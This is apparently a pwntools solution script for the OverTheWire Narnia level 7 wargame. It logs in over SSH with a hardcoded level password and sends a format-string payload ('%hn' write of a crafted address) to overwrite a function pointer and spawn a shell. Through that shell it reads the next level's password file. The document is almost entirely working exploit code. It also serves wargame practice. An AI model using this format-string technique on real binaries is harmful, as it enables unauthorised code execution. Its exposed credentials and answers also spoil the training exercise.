from pwn import *

'''
local exploit:
    r $(python -c 'print "\xf8\xd0\xff\xff" + "%42u" + "%n"')
It will overwrite the address stored in ptrf pointer.
Now, I use h specifier to write only 2 bytes:
    r $(python -c 'print "\x08\xd8\xff\xff" + "%34592u" + "%hn"')
Here we go. It gives us a shell in the gdb.
Now, try it remotely.
'''
con = ssh('narnia7', 'narnia.labs.overthewire.org', password='ahkiaziphu', port=2226)
p = con.process(['/narnia/narnia7', 'AAAAAA'])
p.recvuntil(' (')
address = p32(0xffffdc58)
offset = b'34592'
format_string = address+ b'%' + offset + b'u' + b'%hn'
p = con.process(['/narnia/narnia7', format_string])
p.recv()
p.recv()
p.sendline('cat /etc/narnia_pass/narnia8')
p.recv()
print(p.recv())
